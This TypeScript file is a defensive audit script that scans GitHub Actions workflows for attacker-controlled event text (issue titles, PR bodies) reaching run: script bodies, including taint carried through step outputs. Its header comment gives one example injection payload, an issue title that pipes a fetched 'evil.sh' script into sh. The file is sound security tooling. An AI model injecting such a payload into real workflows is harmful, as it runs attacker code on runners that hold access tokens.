// Copyright (c) 2026 whizBANG Developers LLC. All rights reserved.
// Licensed under AGPL-3.0 (Free) or BSL-1.1 (Solo/Team/Fabrick) with AI Training Restriction. See LICENSE.
/**
 * audit:workflow-taint — attacker-controlled text must never reach a `run:` script body.
 *
 * WHY THIS EXISTS SEPARATELY FROM actionlint
 * ------------------------------------------
 * actionlint already warns when `github.event.issue.title` is interpolated into a script. That is
 * the first hop, and it is the one everybody fixes. It has NO model of a value that passed through
 * a step output, so this laundering is invisible to it:
 *
 *     - id: grab
 *       env:  { T: "${{ github.event.issue.title }}" }     # actionlint: clean, correctly
 *       run:  echo "title=$T" >> "$GITHUB_OUTPUT"
 *     - run: echo "${{ steps.grab.outputs.title }}"        # actionlint: clean, WRONGLY
 *
 * The second interpolation is the issue title, back in a shell body. Measured 2026-08-12 in a
 * sibling repo: fixing only the first hop left three later steps injectable, actionlint reported
 * the file CLEAN, and a checker that modelled propagation found **10 interpolations where
 * actionlint found 2**. A green linter meant "moved", not "fixed".
 *
 * The consequence is not theoretical. These workflows run on `issues` / `pull_request_target`, so
 * the text comes from anyone with a GitHub account, and the runner holds whatever PATs the job
 * declares. A title of `"; curl evil.sh | sh; "` executes.
 *
 * WHAT IT CHECKS
 * --------------
 *   1. A tainted expression inside a `run:` body — the injection itself.
 *   2. Taint PROPAGATION: a step that ingests tainted text (via `env:` or its own `run:`) marks its
 *      declared outputs tainted, so `steps.<id>.outputs.<name>` is tracked for the rest of the job.
 *
 * WHAT IT DELIBERATELY ALLOWS
 * ---------------------------
 * `env:` indirection — the correct fix. The value reaches the shell as a variable, never as script
 * TEXT, so `$TITLE` cannot be parsed as code. A checker that flagged the fix alongside the bug
 * would be disabled within a day, and then it would catch nothing at all.
 *
 * WHY OUTPUT TAINT IS PER-ASSIGNMENT, NOT PER-STEP
 * ------------------------------------------------
 * The first version tainted ALL outputs of any step that ingested tainted text. Run against the
 * real pre-fix files it produced 13 findings of which **6 were false** — steps that read a tainted
 * label string and then emitted `value=Premium`, a hardcoded literal. Nearly half noise is the
 * ratio at which a rule gets switched off, and then it catches nothing at all.
 *
 * So an output is tainted only when the value ASSIGNED to it references tainted data: a tainted
 * `${{ }}` expression, or a shell variable this step bound from one. `value=Premium` stays clean;
 * `title=$T` where `T` came from an issue title does not.
 *
 * KNOWN LIMIT: a value assembled indirectly (`X=$T; echo "k=$X"`) is not traced — that needs a
 * shell parser. The escape is the same `env:` indirection, so an over-flag has a correct fix
 * rather than a suppression.
 *
 * HOW TO NEGATIVE-TEST THIS — the obvious way gives a FALSE PASS
 * -------------------------------------------------------------
 * Dropping an injectable workflow into `.github/workflows/` and re-running gives PASS, with the
 * workflow count UNCHANGED. That is not the scanner failing to reach the repo; it is the scanner
 * being right. The universe is `git ls-files`, deliberately — an auditor's universe must match its
 * consumer's, which is a fresh clone, and it means a scratch file cannot fail somebody's build.
 * The unchanged count is the tool saying so, if you read it.
 *
 * So the probe has to be TRACKED. Use intent-to-add, which stages no content, and remove it in the
 * same command — staging in a tree with live parallel sessions is what swept another session's work
 * into an unrelated commit on 2026-08-12:
 *
 *     git -C <repo> add -N .github/workflows/zz-probe.yml \
 *       && npm --prefix <repo>/code run audit:workflow-taint; \
 *       git -C <repo> rm --cached -q .github/workflows/zz-probe.yml; \
 *       rm <repo>/.github/workflows/zz-probe.yml
 *
 * `npm --prefix <repo>/code`, not a bare `npm run`: no repo in this portfolio has a package.json at
 * its root, so the bare form dies with ENOENT — output that reads exactly like a quiet success. The
 * first version of this very section shipped the bare form, teaching the trap the paragraph above
 * warns about.
 *
 * A competent reviewer hit the false pass first and briefly suspected the scanner. Recorded here so
 * the next one does not.
 */
import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { dirname, join, relative } from 'node:path'
import { fileURLToPath } from 'node:url'
import { load } from 'js-yaml'

const SCRIPT_DIR = dirname(fileURLToPath(import.meta.url))
const PKG = join(SCRIPT_DIR, '..')
const REPO = execFileSync('git', ['-C', PKG, 'rev-parse', '--show-toplevel'], {
  encoding: 'utf-8',
}).trim()

const GREEN = '\x1b[32m'
const RED = '\x1b[31m'
const DIM = '\x1b[2m'
const OFF = '\x1b[0m'

/**
 * Free text an outsider supplies. Deliberately NOT every `github.event.*`: an issue number is an
 * integer and an html_url is GitHub-generated, and flagging those trains people to ignore the rule.
 */
const TAINT_SOURCE =
  /github\.(?:event\.(?:issue|pull_request|comment|discussion|review|head_commit)\.(?:title|body|message|login|name)|head_ref|event\.pull_request\.head\.(?:ref|label|repo\.(?:name|full_name)))/

/** Any `${{ … }}` expression, so each can be classified. */
const EXPR = /\$\{\{([^}]*)\}\}/g

interface Step {
  id?: string
  run?: string
  env?: Record<string, unknown>
  with?: Record<string, unknown>
}
interface Job {
  env?: Record<string, unknown>
  steps?: Step[]
}
interface Workflow {
  jobs?: Record<string, Job>
}

const outputRef = (id: string, name: string): string => `steps.${id}.outputs.${name}`

/**
 * Output names a `run:` body writes to GITHUB_OUTPUT, paired with the text assigned to each — the
 * assignment is what decides taint, not the step it sits in.
 */
function outputAssignments(run: string): { name: string; value: string }[] {
  const out: { name: string; value: string }[] = []
  const lines = run.split('\n')

  lines.forEach((line, i) => {
    // Heredoc form: `name<<DELIM` … value lines … `DELIM`
    const hd = line.match(/(?:^|[\s{"'])([A-Za-z_][A-Za-z0-9_-]*)\s*<<\s*["']?([A-Za-z_][A-Za-z0-9_]*)["']?/)
    if (hd) {
      const [, name, delim] = hd
      const body: string[] = []
      for (let j = i + 1; j < lines.length; j++) {
        if (lines[j]!.trim().replace(/^["']|["']$/g, '') === delim) break
        body.push(lines[j]!)
      }
      out.push({ name: name!, value: body.join('\n') })
      return
    }
    const eq = line.match(/(?:^|[\s{"'])([A-Za-z_][A-Za-z0-9_-]*)\s*=([^\n]*)/)
    if (eq) out.push({ name: eq[1]!, value: eq[2]! })
  })
  return out
}

function isTainted(expr: string, taintedOutputs: Set<string>): boolean {
  if (TAINT_SOURCE.test(expr)) return true
  for (const ref of taintedOutputs) {
    if (expr.includes(ref)) return true
  }
  return false
}

/** Findings for one parsed workflow. */
function scanWorkflow(wf: Workflow, label: string): string[] {
  const problems: string[] = []

  for (const [jobName, job] of Object.entries(wf.jobs ?? {})) {
    const taintedOutputs = new Set<string>()

    for (const step of job.steps ?? []) {
      // Shell variables this step binds from tainted data. `env: { T: <tainted> }` means a later
      // `$T` in the same body carries it.
      const taintedVars = new Set<string>()
      for (const [k, v] of Object.entries({ ...(job.env ?? {}), ...(step.env ?? {}) })) {
        if (typeof v === 'string' && isTainted(v, taintedOutputs)) taintedVars.add(k)
      }

      if (step.run) {
        for (const m of step.run.matchAll(EXPR)) {
          const expr = m[1]!
          if (!isTainted(expr, taintedOutputs)) continue
          // In a run body the value becomes script TEXT — this is the injection.
          problems.push(
            `${label} › ${jobName}: \`\${{${expr.trim()}}}\` is interpolated into a run: body.\n` +
              '        Attacker text becomes script source here. Pass it through `env:` and read\n' +
              '        the variable instead — the value then cannot be parsed as code.'
          )
        }
      }

      // Propagate PER ASSIGNMENT: only an output whose assigned value references tainted data.
      if (step.id && step.run) {
        for (const { name, value } of outputAssignments(step.run)) {
          const viaExpr = [...value.matchAll(EXPR)].some((m) => isTainted(m[1]!, taintedOutputs))
          const viaVar = [...taintedVars].some((v) =>
            new RegExp(`\\$\\{?${v}\\b`).test(value)
          )
          if (viaExpr || viaVar) taintedOutputs.add(outputRef(step.id, name))
        }
      }
    }
  }
  return problems
}

/** Paired self-test. Refuses to scan if the corpus fails — both halves. */
function selfTest(): void {
  const corpusPath = join(SCRIPT_DIR, 'fixtures', 'workflow-taint-corpus.yml')
  let cases: { name: string; expect: string; workflow: Workflow }[]
  try {
    cases = load(readFileSync(corpusPath, 'utf-8')) as typeof cases
  } catch (e) {
    console.error(`\n  ${RED}✗${OFF} corpus unreadable: ${(e as Error).message}`)
    console.error('    The rule is unverified — refusing to report a clean scan.\n')
    process.exit(1)
  }

  if (!Array.isArray(cases) || !cases.length) {
    console.error(`\n  ${RED}✗${OFF} corpus declares no cases — refusing to pass vacuously.\n`)
    process.exit(1)
  }

  const failures: string[] = []
  for (const c of cases) {
    const found = scanWorkflow(c.workflow, 'corpus').length > 0
    const want = c.expect === 'catch'
    if (found !== want) failures.push(`${c.expect.toUpperCase()} expected, got ${found ? 'catch' : 'ignore'}: ${c.name}`)
  }

  if (failures.length) {
    console.error(`\n  ${RED}✗${OFF} self-test failed — the rule does not behave as specified:`)
    for (const f of failures) console.error(`      ${f}`)
    console.error('\n    Refusing to scan.\n')
    process.exit(1)
  }
  const catches = cases.filter((c) => c.expect === 'catch').length
  console.log(
    `  ${GREEN}✓${OFF} self-test: ${cases.length}/${cases.length} corpus cases ` +
      `${DIM}(${catches} catch, ${cases.length - catches} ignore)${OFF}`
  )
}

function main(): number {
  console.log('\n  Workflow taint — attacker text must not reach a run: body\n')
  selfTest()

  const files = execFileSync('git', ['-C', REPO, 'ls-files', '.github/workflows'], {
    encoding: 'utf-8',
  })
    .split('\n')
    .filter((f) => /\.ya?ml$/.test(f))

  if (!files.length) {
    console.log(`  ${GREEN}✓${OFF} no workflows in this repo — nothing to check\n`)
    return 0
  }

  const problems: string[] = []
  for (const rel of files) {
    let wf: Workflow
    try {
      wf = load(readFileSync(join(REPO, rel), 'utf-8')) as Workflow
    } catch (e) {
      problems.push(`${rel} is not parseable YAML: ${(e as Error).message}`)
      continue
    }
    problems.push(...scanWorkflow(wf, rel))
  }

  console.log(
    `  ${GREEN}✓${OFF} ${files.length} workflow(s) scanned ${DIM}(taint propagates through step outputs)${OFF}`
  )

  if (problems.length) {
    console.log('')
    for (const p of problems) console.log(`${RED}  ✗ ${p}${OFF}`)
    console.log(
      `\n${RED}\x1b[1mRESULT: FAIL${OFF} — attacker-controlled text reaches a shell.\n` +
        `      ${relative(REPO, PKG)}: pass the value through \`env:\` and read the variable.\n`
    )
    return 1
  }
  console.log(`\n${GREEN}\x1b[1mRESULT: PASS${OFF} — no attacker text reaches a run: body\n`)
  return 0
}

process.exit(main())
